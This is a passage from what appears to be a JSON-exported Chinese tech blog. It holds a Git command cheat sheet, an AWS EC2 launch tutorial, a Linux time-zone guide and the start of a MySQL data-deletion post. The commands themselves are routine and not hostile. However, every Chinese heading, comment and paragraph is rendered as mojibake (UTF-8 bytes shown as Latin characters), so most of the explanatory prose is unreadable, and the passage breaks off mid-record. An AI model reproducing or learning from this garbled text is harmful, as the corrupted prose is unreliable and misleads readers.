å¿½ç•¥çš„æ–‡ä»¶åˆ—è¡¨$ git status --ignored# åˆ—å‡ºæ²¡æœ‰è¢« .gitignore å¿½ç•¥çš„æ–‡ä»¶åˆ—è¡¨$ git ls-files æ–‡ä»¶æ“ä½œ1234567891011121314151617181920# æš‚å­˜æ‰€æœ‰$ git add -A# æš‚å­˜æŸä¸ªæ–‡ä»¶$ git add .&#x2F;README.md# æ·»åŠ å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒº $ git add .# æš‚å­˜ä¸€ç³»åˆ—æ–‡ä»¶$ git add 1.txt 2.txt ...# ä»æš‚å­˜åŒºä¸­åˆ é™¤æ–‡ä»¶ï¼ˆgit add çš„åå‘æ“ä½œï¼‰$ git rm [file] # æš‚å­˜åŒºã€å·¥ä½œåŒºä¸€èµ·åˆ é™¤$ git rm -f [file]# åœæ­¢è¿½è¸ªæŒ‡å®šæ–‡ä»¶ï¼Œä½†è¯¥æ–‡ä»¶ä¼šä¿ç•™åœ¨å·¥ä½œåŒº$ git rm --cached [file] æŸ¥çœ‹æ–‡ä»¶æ”¹åŠ¨123456789101112131415# æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶æ”¹åŠ¨$ git diff# æŸ¥çœ‹å…·ä½“æ–‡ä»¶çš„æ”¹åŠ¨$ git diff README.md# æŸ¥çœ‹æŒ‡å®š commit-id æ”¹åŠ¨å†…å®¹$ git diff [commit-id]# å¯¹æ¯”å·¥ä½œåŒºå’Œç‰ˆæœ¬åº“é‡Œçš„æœ€æ–°ç‰ˆæœ¬æœ‰ä»€ä¹ˆåŒºåˆ«$ git diff HEAD --[file-name]# æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„å†å²ä¿®æ”¹è®°å½•$ git log README.md$ git show [commit-id] README.md æ’¤é”€ä¸å›æ»š1234567891011121314151617# æ¢å¤æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶åˆ°å·¥ä½œåŒº$ git checkout [file]# æ¢å¤æš‚å­˜åŒºçš„æ‰€æœ‰æ–‡ä»¶åˆ°å·¥ä½œåŒº$ git checkout .# é‡ç½®æš‚å­˜åŒºä¸å·¥ä½œåŒºï¼Œä¸ä¸Šä¸€æ¬¡commitä¿æŒä¸€è‡´$ git reset --hard# å›æ»šä¸Šä¸€ä¸ªç‰ˆæœ¬$ git reset --hard HEAD^# å›é€€åˆ°æŒ‡å®šç‰ˆæœ¬ï¼ˆä¼šé‡ç½®æš‚å­˜åŒºä¸å·¥ä½œåŒºï¼‰$ git reset --hard [commit-id]# å›é€€åˆ°æŒ‡å®šç‰ˆæœ¬ï¼ˆä¸ä¼šé‡ç½®æš‚å­˜åŒºä¸å·¥ä½œåŒºï¼Œä¼šå›åˆ°è¯¥ç‰ˆæœ¬çš„æš‚å­˜çŠ¶æ€ï¼‰$ git reset --soft [commit-id] æäº¤123456789101112# æäº¤æš‚å­˜åŒºåˆ°æœ¬åœ°ä»“åº“$ git commit -m [message]# æäº¤æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶åˆ°æœ¬åœ°ä»“åº“git commit README.md -m [message]# æäº¤å¹¶æ˜¾ç¤ºdiffå˜åŒ–git commit -v# é‡å†™ä¸Šä¸€æ¬¡çš„æäº¤# å¦‚æœä»£ç æ²¡æœ‰ä»»ä½•æ–°å˜åŒ–ï¼Œåˆ™ç”¨æ¥æ”¹å†™ä¸Šä¸€æ¬¡commitçš„æäº¤ä¿¡æ¯$ git commit --amend -m [message] æ—¥å¿—1234567891011121314151617181920# æŸ¥çœ‹å®Œæ•´å†å²æäº¤è®°å½•$ git log# æŸ¥çœ‹å‰n æ¡è®°å½•$ git log -n# ä»¥å›¾å½¢æ–¹å¼æŸ¥çœ‹å®Œæ•´å†å²æäº¤è®°å½•$ git log --graph --pretty&#x3D;oneline --abbrev-commit# é€šè¿‡commit log è¿›è¡Œæœç´¢$ git log -i --grep&#x3D;&quot;fire bug&quot;# åˆ—å‡ºæäº¤è€…è´¡çŒ®æ•°é‡, åªä¼šæ‰“å°ä½œè€…å’Œè´¡çŒ®æ•°é‡$ git shortlog -sn# ä»¥æäº¤è´¡çŒ®æ•°é‡æ’åºå¹¶æ‰“å°å‡ºä¿¡æ¯$ git shortlog -n# é‡‡ç”¨é‚®ç®±æ ¼å¼åŒ–çš„æ–¹å¼è¿›è¡ŒæŸ¥çœ‹è´¡çŒ®åº¦$ git shortlog -e åˆ†æ”¯123456789101112131415161718192021222324252627282930313233343536373839404142434445# æŸ¥çœ‹æœ¬åœ°åˆ†æ”¯git branch# æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯git branch -a# æŸ¥çœ‹æœ¬åœ°åˆ†æ”¯æ‰€å…³è”çš„è¿œç¨‹åˆ†æ”¯git branch -vv# æŸ¥çœ‹æœ¬åœ° master åˆ†æ”¯åˆ›å»ºæ—¶é—´git reflog show --date&#x3D;iso master# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä½†ä¾ç„¶åœç•™åœ¨å½“å‰åˆ†æ”¯$ git branch [branch-name]# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œå¹¶åˆ‡æ¢åˆ°è¯¥åˆ†æ”¯$ git checkout -b [branch]# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼ŒæŒ‡å‘æŒ‡å®šcommit$ git branch [branch] [commit-id]# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä¸æŒ‡å®šçš„è¿œç¨‹åˆ†æ”¯å»ºç«‹è¿½è¸ªå…³ç³»$ git branch --track [branch] [remote-branch]# åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯ï¼Œå¹¶æ›´æ–°å·¥ä½œåŒº$ git checkout [branch-name]# å»ºç«‹è¿½è¸ªå…³ç³»ï¼Œåœ¨ç°æœ‰åˆ†æ”¯ä¸æŒ‡å®šçš„è¿œç¨‹åˆ†æ”¯ä¹‹é—´$ git branch --set-upstream [branch] [remote-branch]# åˆå¹¶æŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯$ git merge [branch]# é€‰æ‹©ä¸€ä¸ªcommitï¼Œåˆå¹¶è¿›å½“å‰åˆ†æ”¯$ git cherry-pick [commit-id]# åˆ é™¤æŒ‡å®šåˆ†æ”¯$ git branch -d [branch-name]# å¼ºåˆ¶åˆ é™¤æŒ‡å®šåˆ†æ”¯$ git branch -D [branch-name]# åˆ é™¤è¿œç¨‹åˆ†æ”¯$ git push origin --delete [branch-name]$ git branch -dr [remote&#x2F;branch] è¿œç¨‹ä»“åº“ç®¡ç†1234567891011121314151617# æŸ¥çœ‹è¿œç¨‹ä»“åº“ï¼ˆé»˜è®¤æ˜¯originï¼Œè¿™æ˜¯git ä¼šä½¿ç”¨çš„é»˜è®¤åç§°ï¼‰$ git remote # æŒ‡å®š-v, æŸ¥çœ‹æ‰€æœ‰è¿œç¨‹ä»“åº“åœ°å€$ git remote -v# æ·»åŠ ä¸€ä¸ªæ–°çš„è¿œç¨‹ä»“åº“$ git remote add [origin-name] https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git# æŸ¥çœ‹æŒ‡å®šè¿œç¨‹ä»“åº“çš„è¯¦æƒ…ä¿¡æ¯$ git remote show [origin-name]# é‡å‘½åè¿œç¨‹ä»“åº“$ git remote rename [old-name] [new-name]# ç§»é™¤è¿œç¨‹ä»“åº“$ git remote remove [origin-name] Push1234567891011# é»˜è®¤æ¨é€å½“å‰åˆ†æ”¯$ git push# æ¨é€å†…å®¹åˆ°ä¸»åˆ†æ”¯ï¼Œå¹¶å»ºç«‹è¿½è¸ªå…³ç³»$ git push -u origin master# å°†æœ¬åœ°åˆ†æ”¯æ¨é€åˆ°æŒ‡å®šè¿œç¨‹åˆ†æ”¯ï¼Œ ï¼ˆæœ¬åœ°åˆ†æ”¯:è¿œç¨‹åˆ†æ”¯ï¼‰$ git push origin [branch]:[branch]# å¼ºè¡Œæ¨é€å½“å‰åˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“ï¼Œå³ä½¿æœ‰å†²çª$ git push -f Pull1234567891011# å–å›é»˜è®¤è¿œç¨‹ä»“åº“çš„å˜åŒ–ï¼Œå¹¶è‡ªåŠ¨ä¸æœ¬åœ°åˆ†æ”¯åˆå¹¶$ git pull# å–å›æŒ‡å®šè¿œç¨‹ä»“åº“çš„å˜åŒ–ï¼Œå¹¶è‡ªåŠ¨ä¸æœ¬åœ°æŒ‡å®šåˆ†æ”¯åˆå¹¶ï¼ˆè¿œç¨‹åˆ†æ”¯å:æœ¬åœ°åˆ†æ”¯åï¼‰$ git pull [remote] [branch]:[branch]# å–å›æŒ‡å®šè¿œç¨‹ä»“åº“çš„å˜åŒ–ï¼Œå¹¶è‡ªåŠ¨ä¸æœ¬åœ°å½“å‰åˆ†æ”¯åˆå¹¶$ git pull origin master# å–å›è¿œç¨‹ä»“åº“çš„æ‰€æœ‰å˜åŠ¨ï¼Œä½†æ˜¯ä¸ä¼šè‡ªåŠ¨ä¸æœ¬åœ°å½“å‰åˆ†æ”¯åˆå¹¶$ git fetch è¿›é˜¶æ“ä½œè¿›é˜¶æ“ä½œä¸­çš„å‘½ä»¤æ˜¯ä¸€äº›å¾ˆå®ç”¨ï¼Œä½†å¯èƒ½ä¸å¸¸ä½¿ç”¨ï¼Œæ‰€ä»¥æŠŠå®ƒä»¬å•ç‹¬æ‹å‡ºæ¥ã€‚ cherry-pick12345# é€‰æ‹©ä¸€ä¸ªcommitï¼Œåˆå¹¶è¿›å½“å‰åˆ†æ”¯$ git cherry-pick [commit-id]# ä¿ç•™åŸæœ‰ä½œè€…ä¿¡æ¯è¿›è¡Œæäº¤$ git cherry-pick -x [commit-id] Stash1234567891011# å°†å½“å‰çš„å·¥ä½œåŒºéšè—$ git stash# æ¢å¤éšè—çš„å·¥ä½œåŒºï¼Œå¹¶å°†æ­¤æ¬¡éšè—è®°å½•ä»éšè—åˆ—è¡¨ä¸­ç§»å‡º$ git stash pop# æ¢å¤éšè—çš„å·¥ä½œåŒºï¼Œä¿ç•™æ­¤æ¬¡éšè—è®°å½•$ git stash apply# æŸ¥çœ‹å½“å‰éšè—åˆ—è¡¨$ git stash list Blamegit blame ç”¨äºæŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„ä¿®æ”¹å†å²è®°å½•æ˜¯å“ªä¸ªä½œè€…è¿›è¡Œäº†æ”¹åŠ¨ã€‚ 12345678# æŸ¥çœ‹ README.md æ–‡ä»¶çš„ä¿®æ”¹å†å²è®°å½•ï¼ŒåŒ…æ‹¬æ—¶é—´ã€ä½œè€…ä»¥åŠå†…å®¹$ git blame README.md# æŸ¥çœ‹è°æ”¹åŠ¨äº† README.md æ–‡ä»¶çš„ 11è¡Œ-12è¡Œ$ git blame -L 11,12 README.md# æŸ¥çœ‹è°æ”¹åŠ¨äº† README.md æ–‡ä»¶11è¡Œä»¥å$ git blame -L 11 README.md æ ‡ç­¾1234567891011121314151617181920212223242526272829303132# åˆ—å‡ºæœ¬åœ°æ‰€æœ‰æ ‡ç­¾git tag# æ–°å»ºä¸€ä¸ªtagåœ¨å½“å‰commit$ git tag [tag]# æ–°å»ºä¸€ä¸ªtagåœ¨æŒ‡å®šcommit$ git tag [tag] [commit]# åˆ é™¤æœ¬åœ°tag$ git tag -d [tag]# åˆ é™¤è¿œç¨‹tag$ git push origin :refs&#x2F;tags&#x2F;[tagName]# åˆ—å‡ºè¿œç¨‹æ‰€æœ‰æ ‡ç­¾$ git ls-remote --tags origin# åˆ›å»ºå¸¦æœ‰é™„æ³¨æ ‡ç­¾$ git tag -a v1.1.0 -m &quot;æ ‡ç­¾æè¿°&quot;# æŸ¥çœ‹æœ¬åœ°tagä¿¡æ¯$ git show [tag]# æäº¤æŒ‡å®štag$ git push [remote] [tag]# æäº¤æ‰€æœ‰tag$ git push [remote] --tags# æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼ŒæŒ‡å‘æŸä¸ªtag$ git checkout -b [branch] [tag] Git ProTipsGit ProTips åˆ™æ˜¯æ•´ç†çš„ä¸€äº›Git çš„å¥‡æŠ€æ·«å·§ã€‚ 12345678910# é€šè¿‡ä½¿ç”¨åˆ«åï¼Œä¼˜åŒ– git log è¾“å‡ºï¼Œè¿™é‡Œå¦å¤–æä¾›å‡ ç§æ¨¡å¼, å¯ä»¥é€‰æ‹©å–œæ¬¢çš„ä¸€ç§è¿›è¡Œåˆ«åé…ç½®$ git config --global alias.lg &quot;log --graph --pretty&#x3D;format:&#39;%Cred%h - %Cgreen[%an]%Creset -%C(yellow)%d%Creset %s %C(yellow)&lt;%cr&gt;%Creset&#39; --abbrev-commit --date&#x3D;relative&quot;$ git config --global alias.his &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Creset %s %C(magenta)in %Cred%h %C(magenta)commited by %Cgreen%cn %C(magenta)on %C(yellow) %cd %C(magenta)from %Creset %C(yellow)%d&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;$ git config --global alias.hist &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Cred%h - %C(bold white) %s %Creset %C(yellow)%d %C(cyan) &lt;%cd&gt; %Creset %Cgreen(%cn)&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;$ git config --global alias.lg &quot;log --color --graph --pretty&#x3D;format:&#39;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#39; --abbrev-commit&quot;$ git config --global alias.lg &quot;log --pretty&#x3D;format:&#39;%h - %an, %ar : %s&#39; &quot; å‚è€ƒé“¾æ¥ Git å¸¸ç”¨å‘½ä»¤æ•´ç† å¸¸ç”¨Git å‘½ä»¤æ¸…å•","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•åˆ›å»ºå¯åŠ¨ AWS å®ä¾‹","slug":"teach-you-how-to-start-an-aws-instance","date":"2020-08-10T06:05:17.000Z","updated":"2020-08-27T06:26:53.546Z","comments":true,"path":"teach-you-how-to-start-an-aws-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-start-an-aws-instance/","excerpt":"ä»€ä¹ˆæ˜¯AWS ï¼Ÿ Amazon Web Services (AWS) æ˜¯äºšé©¬é€Šæä¾›çš„å…¨çƒæœ€å…¨é¢ã€åº”ç”¨æœ€å¹¿æ³›çš„äº‘å¹³å°ã€‚","text":"ä»€ä¹ˆæ˜¯AWS ï¼Ÿ Amazon Web Services (AWS) æ˜¯äºšé©¬é€Šæä¾›çš„å…¨çƒæœ€å…¨é¢ã€åº”ç”¨æœ€å¹¿æ³›çš„äº‘å¹³å°ã€‚ äº‘è¿™ä¸ªæ¦‚å¿µæœ€å¼€å§‹æ˜¯ä»å›½å†…çš„é˜¿é‡Œäº‘ã€è…¾è®¯äº‘è¿™äº›åœ°æ–¹å¬åˆ°çš„ï¼Œåæ¥æœåŠ¡å™¨æ¥è§¦çš„å¤šäº†ï¼Œä¹Ÿæ…¢æ…¢äº†è§£äº†ä¸€äº›å›½å¤–çš„äº‘ï¼Œå¦‚ï¼šäºšé©¬é€Šäº‘ã€å¾®è½¯äº‘ã€‚ åœ¨äºšé©¬é€Šäº‘ã€è½¯å¾®äº‘ä¸Šåˆ›å»ºä¸€å°å®ä¾‹å…¶å®æ˜¯éå¸¸ç®€å•çš„äº‹æƒ…ï¼Œä½†ç”±äºè¿™æ–¹é¢èµ„æ–™æ¯”è¾ƒå°‘ï¼Œå¯¼è‡´å¯¹äºæ–°ç”¨æˆ·å¯èƒ½ä¸é‚£ä¹ˆå‹å¥½ï¼Œæˆ‘è‡ªå·±å½“åˆåˆ›å»ºæ—¶å°±ä¸æ€ä¹ˆé¡ºåˆ©ã€‚æ‰€ä»¥æ•´ç†è¿™ç¯‡ç¬”è®°çš„ç›®çš„æœ‰ä¸¤ä¸ªï¼Œä¸€æ˜¯æ–¹ä¾¿è‡ªå·±æ—¥åå›é¡¾ï¼ŒäºŒæ˜¯ç»™ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„ç”¨æˆ·ä¸€äº›å‚è€ƒã€‚ å¯åŠ¨å®ä¾‹é¦–å…ˆç™»å…¥åˆ°AWS ï¼Œæ‰¾åˆ°EC2 å¹¶ç‚¹å‡» åœ¨å·¦ä¾§èœå•æ ä¸­ç‚¹å‡»å®ä¾‹ ç‚¹å‡»å¯åŠ¨å®ä¾‹ é…ç½®å®ä¾‹é€‰æ‹©ç³»ç»Ÿæ˜ åƒï¼Œè¿™é‡Œä»¥Linux æ“ä½œç³»ç»Ÿä¸ºä¾‹ï¼Œæˆ‘é€‰æ‹©æ˜¯Ubuntu Server 18.04 LTSï¼Œè¿™ä¸ªç‰ˆæœ¬è¡¨ç¤ºUbuntu æœåŠ¡ç«¯ é•¿æœŸç¨³å®šæ”¯æŒç‰ˆæœ¬ã€‚ é€‰æ‹©å®ä¾‹ç±»å‹ï¼Œæ ¹æ®è‡ªèº«éœ€è¦è€ƒè™‘ï¼Œå½“ç„¶ æ€§èƒ½è¶Šå¥½ä»·æ ¼è¶Šé«˜ã€‚è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ä¸€ä¸ªä¸­ç­‰åä¸‹çš„ç±»å‹ã€‚ é…ç½®å®ä¾‹è¯¦æƒ…ä¿¡æ¯ï¼Œè¿™é‡Œçš„è¿™äº›æ ¸å¿ƒé…ç½®ï¼Œé€šå¸¸éƒ½ä¿æŒé»˜è®¤ï¼Œåªæ˜¯å°†è‡ªåŠ¨åˆ†é…å…¬æœ‰IP åœ°å€æ”¹ä¸ºç¦ç”¨ã€‚è¿™æ ·å†é‡å¯æœºå™¨æ—¶ï¼Œå°±ä¸ä¼šæ”¹å˜IPäº†ã€‚ æ ¹æ®è‡ªèº«éœ€è¦åˆ†é…åˆé€‚çš„ç¡¬ç›˜å¤§å°ã€‚ é…ç½®å®‰å…¨ç»„ï¼Œæ‰€è°“å®‰å…¨ç»„å°±æ˜¯æ‹¥æœ‰ç›¸åŒé˜²ç«å¢™è§„åˆ™çš„ç¾¤ç»„ã€‚è¿™ä¸ªä¹Ÿæ˜¯æ ¹æ®è‡ªèº«éœ€è¦é€‰æ‹©æ˜¯å¦å…±ç”¨åŒä¸€ä¸ªå®‰å…¨ç»„ã€‚ æ‹¥æœ‰åŒä¸€ä¸ªå®‰å…¨ç»„å°±è¡¨ç¤ºæ‹¥æœ‰ç›¸åŒçš„é˜²ç«å¢™è§„åˆ™ã€‚è®¾ç½®å®Œå®‰å…¨ç»„ä¹‹åï¼Œç‚¹å‡»å®¡æ ¸å’Œå¯åŠ¨ã€‚ ä¸‹é¢ä¼šæœ‰ä¸€ä¸ªç•Œé¢ç»™ä½ ç¡®è®¤æœºå™¨çš„é…ç½®æ˜¯å¦æ— è¯¯çš„ï¼Œä»å¤´åˆ°å°¾æ£€æŸ¥æ²¡æœ‰é—®é¢˜ä¹‹åå°±å¯ä»¥ç‚¹å‡»å¯åŠ¨å®ä¾‹äº†ã€‚ åˆ›å»ºå¯†é’¥å¯ä»¥é€‰æ‹©å…±ç”¨å·²æœ‰çš„å¯†é’¥å¯¹ä¹Ÿå¯ä»¥é€‰æ‹©æ–°å»ºä¸€ä¸ªã€‚ ç„¶åç‚¹å‡»å¯åŠ¨å®ä¾‹ã€‚ åˆ†é…å¼¹æ€§IPå¯åŠ¨å®Œæˆä¹‹åç‚¹å‡»æŸ¥çœ‹å®ä¾‹ã€‚ åœ¨å®ä¾‹åˆ—è¡¨ä¸­ï¼Œæ‰¾åˆ°è¯¥å®ä¾‹ä¹‹åï¼Œåˆ†åˆ«ç‚¹å‡»æ“ä½œ=&gt;è”ç½‘=&gt;ç®¡ç†IP åœ°å€=&gt;åˆ†é…å¼¹æ€§ IP ç¡®è®¤åˆ†é… åˆ†é…æˆåŠŸä¹‹åï¼Œä¼šå¾—åˆ°ä¸€ä¸ªå¼¹æ€§IPï¼ˆå…¬æœ‰ï¼‰ï¼Œç„¶åè¿”å›å®ä¾‹åˆ—è¡¨ å…³è”IP åœ°å€æ‰¾åˆ°åˆšæ‰å¯åŠ¨çš„é‚£ä¸ªå®ä¾‹ï¼ˆæ²¡æœ‰å®ä¾‹IDï¼‰ï¼Œåˆ†åˆ«ç‚¹å‡»æ“ä½œ=&gt;å…³è”åœ°å€ è¿™ä¸€æ­¥å¾ˆé‡è¦ï¼Œè¿™é‡Œè¦å°†å®ä¾‹å’Œå¼¹æ€§IP åœ°å€å…³è”ï¼Œæ‰€ä»¥è¦é€‰æ‹©è¯¥å¼¹æ€§IP å¯¹åº”è‡ªå·±çš„å®ä¾‹ã€‚å¦‚æœä¸ç¡®å®šæ˜¯å“ªä¸€ä¸ªï¼Œå¯ä»¥è¿”å›åˆ°å®ä¾‹åˆ—è¡¨ä¸­å»æŸ¥çœ‹ï¼Œå°±æ˜¯é‚£ä¸ªæ²¡æœ‰åç§°çš„å®ä¾‹ã€‚ ç„¶åç‚¹å‡»å…³è” å…³è”æˆåŠŸ ç›´åˆ°åšå®Œè¿™ä¸€æ­¥æ‰ç®—æ­£çœŸçš„å¯åŠ¨å¥½ä¸€ä¸ªå®ä¾‹ã€‚ è¿æ¥å¯åŠ¨å¥½å®ä¾‹ä¹‹åï¼Œå¦‚ä½•è¿æ¥å‘¢ï¼Ÿ 1$ ssh -i &lt;ç§é’¥è·¯å¾„&gt; ubuntu@ipaddress æŒ‡å®šåˆšæ‰ç”Ÿæˆçš„å¯†é’¥å¯¹ï¼Œä½¿ç”¨sshå‘½ä»¤ å³å¯è¿æ¥ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"äº‘","slug":"äº‘","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"å¦‚ä½•ä¿®æ”¹ Linux é»˜è®¤æ—¶åŒº","slug":"how-to-modify-the-linux-default-time-zone","date":"2020-08-09T13:23:30.000Z","updated":"2020-08-22T00:44:06.247Z","comments":true,"path":"how-to-modify-the-linux-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-linux-default-time-zone/","excerpt":"åœ¨ä¸Šä¸€ç¯‡ç¬”è®°ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†å¦‚ä½•åœ¨Linux ä¸­æŸ¥çœ‹ç³»ç»Ÿé»˜è®¤æ—¶åŒºï¼Œè¿™ç¯‡ç¬”è®°æ¥å­¦ä¹ ä»¥ä¸‹å¦‚ä½•ä¿®æ”¹é»˜è®¤æ—¶åŒºã€‚","text":"åœ¨ä¸Šä¸€ç¯‡ç¬”è®°ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†å¦‚ä½•åœ¨Linux ä¸­æŸ¥çœ‹ç³»ç»Ÿé»˜è®¤æ—¶åŒºï¼Œè¿™ç¯‡ç¬”è®°æ¥å­¦ä¹ ä»¥ä¸‹å¦‚ä½•ä¿®æ”¹é»˜è®¤æ—¶åŒºã€‚ åœ¨Linux æœåŠ¡å™¨æˆ–ç³»ç»Ÿä¸Šä¿æŒæ­£ç¡®çš„æ—¶é—´å§‹ç»ˆæ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼Œå®ƒå¯èƒ½å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š ç”±äºLinux ä¸­çš„å¤§å¤šæ•°ä»»åŠ¡éƒ½æ˜¯æŒ‰æ—¶é—´æ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥ä¿æŒç³»ç»Ÿä»»åŠ¡çš„åŠæ—¶è¿è¡Œã€‚ åœ¨ç³»ç»Ÿä¸Šè®°å½•äº‹ä»¶å’Œå…¶ä»–ä¿¡æ¯çš„æ­£ç¡®æ—¶é—´ç­‰ç­‰ã€‚ åœ¨Linux ä¸­è®¾ç½®æ—¶åŒºï¼Œæœ‰å‡ ç§æ–¹å¼ã€‚ 0x1. ä½¿ç”¨tzselete å‘½ä»¤ ä½¿ç”¨tzselete å‘½ä»¤é€‰æ‹©æ‰€åœ¨æ—¶åŒºã€‚ å°†æ—¶åŒºæ‰€åœ¨çš„é…ç½®æ–‡ä»¶TZ=&#39;Asia/Shanghai&#39;; export TZ æ·»åŠ åˆ°~/.profileæ–‡ä»¶ã€‚ ä½¿ç”¨source ~/.profireå‘½ä»¤ï¼Œä½¿æ—¶åŒºè®¾ç½®ç”Ÿæ•ˆã€‚ 0x2. ä½¿ç”¨timedatectl å‘½ä»¤Ubuntu ç³»ç»Ÿæä¾›äº†timedatectl å‘½ä»¤ï¼Œéå¸¸æ–¹ä¾¿çš„ä¾›æˆ‘ä»¬æŸ¥çœ‹è®¾ç½®Linux ç³»ç»Ÿæ—¶åŒºã€‚ 1$ timedatectl set-timezone &quot;Asia&#x2F;ShangHai&quot; å¦‚æœä½ å¿˜è®°äº†ä½ æƒ³è¦çš„æ—¶åŒºå«ä»€ä¹ˆåå­—ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰å¯ç”¨æ—¶åŒºï¼š 1$ timedatectl list-timezones å› ä¸º Linux çš„æ—¶é—´åˆ†ä¸ºä¸¤ç§ï¼š ç¡¬ä»¶æ—¶é—´ï¼šç”± BIOSï¼ˆæˆ–CMOSï¼‰æ‰€è´Ÿè´£ã€‚ ç³»ç»Ÿæ—¶é—´ï¼šç”± Linux æ‰€è´Ÿè´£ï¼Œç³»ç»Ÿæ—¶é—´åœ¨ç³»ç»Ÿå¼€å…³æœºåè¯»å–ç¡¬ä»¶æ—¶é—´åï¼Œå†ç”± Linux ç®¡ç†æ—¶é—´ã€‚ 0x3. è®¾ç½®ç¡¬ä»¶æ—¶é—´12$ cd &#x2F;etc&#x2F; &amp;&amp; ls -al | grep localtimelrwxrwxrwx 1 root root 27 Jul 24 00:57 localtime -&gt; &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Etc&#x2F;UTC å¯ä»¥çœ‹åˆ°é»˜è®¤é“¾æ¥çš„æ˜¯UTCï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨æ›´æ”¹é“¾æ¥æ—¶åŒºæ–‡ä»¶ã€‚ 1$ ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime æŸ¥çœ‹ç¡¬ä»¶æ—¶é—´ 1$ hwclock -r å°†ç³»ç»Ÿæ—¶é—´æ”¹ä¸ºç¡¬ä»¶æ—¶é—´ 1$ hwclock --hctosys éœ€è¦æƒ³æ¸…æ¥šçš„æ˜¯ï¼Œæ—¶é—´æˆ³æœ¬èº«æ˜¯æ°¸è¿œä¸å˜çš„ï¼Œæ— è®ºåœ¨å“ªä¸ªæ—¶åŒºåŒä¸€æ—¶åˆ»æ‰€ç”Ÿæˆçš„æ—¶é—´æˆ³ä¸€å®šæ˜¯ä¸€æ ·çš„ã€‚ ä¼šå‘ç”Ÿå˜åŒ–çš„åªæœ‰æ—¶åŒºï¼Œè€Œæ—¶é—´æˆ³åˆ™æ˜¯æ ¹æ®æ—¶åŒºçš„ä¸åŒè€Œè§£æå‡ºæ¥çš„æ—¶é—´ä¸åŒã€‚ å‚è€ƒé“¾æ¥ How to Set Time, Timezone and Synchronize System Clock Using timedatectl Command Linux æŸ¥çœ‹è®¾ç½®ç³»ç»Ÿæ—¶åŒº Linux æ—¶é—´ä»¥åŠæ—¶åŒº","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Mysql åˆ é™¤æ•°æ®åŠæ•°æ®è¡¨","slug":"mysql-delete-data-and-data-table","date":"2020-08-06T14:36:46.000Z","updated":"2020-09-20T15:39:21.488Z","comments":true,"path":"mysql-delete-data-and-data-table/","link":"","permalink":"https://www.0x2beace.com/mysql-delete-data-and-data-table/","excerpt":"åœ¨Mysql ä¸­åˆ é™¤æ•°æ®ä»¥åŠæ•°æ®è¡¨éå¸¸çš„å®¹æ˜“ï¼Œä½†æ˜¯éœ€è¦ç‰¹åˆ«å°å¿ƒï¼Œå› ä¸ºä¸€æ—¦åˆ é™¤æ‰€æœ‰æ•°æ®éƒ½ä¼šæ¶ˆå¤±ã€‚","text":"åœ¨Mysql ä¸­åˆ é™¤æ•°æ®ä»¥åŠæ•°æ®è¡¨éå¸¸çš„å®¹æ˜“ï¼Œä½†æ˜¯éœ€è¦ç‰¹åˆ«å°å¿ƒï¼Œå› ä¸ºä¸€æ—¦åˆ é™¤æ‰€æœ‰æ•°æ®éƒ½ä¼šæ¶ˆå¤±ã€‚ åˆ é™¤æ•°æ®åˆ é™¤è¡¨å†…æ•°æ®ï¼Œä½¿ç”¨deleteå…³é”®å­—ã€‚ åˆ é™¤æŒ‡å®šæ¡ä»¶çš„æ•°æ®åˆ é™¤ç”¨æˆ·è¡¨å†…id ä¸º1 çš„ç”¨æˆ·ï¼š 1delete from User where id &#x3D; 1; 